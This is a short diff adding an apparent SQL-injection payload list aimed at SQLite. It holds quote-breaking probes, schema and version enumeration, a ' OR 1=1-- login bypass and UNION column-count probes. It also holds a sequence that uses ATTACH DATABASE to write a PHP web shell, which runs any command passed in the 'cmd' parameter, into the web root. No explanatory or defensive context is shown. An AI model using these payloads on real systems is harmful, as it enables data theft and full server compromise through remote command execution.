@@ -1,0 +1,12 @@
+'
+"
+'--
+SELECT sqlite_version();
+SELECT name FROM sqlite_master WHERE type='table';
+PRAGMA table_info('users');
+ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
+CREATE TABLE pwn.shell (code TEXT);
+INSERT INTO pwn.shell (code) VALUES ('<?php system($_GET["cmd"]); ?>');
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
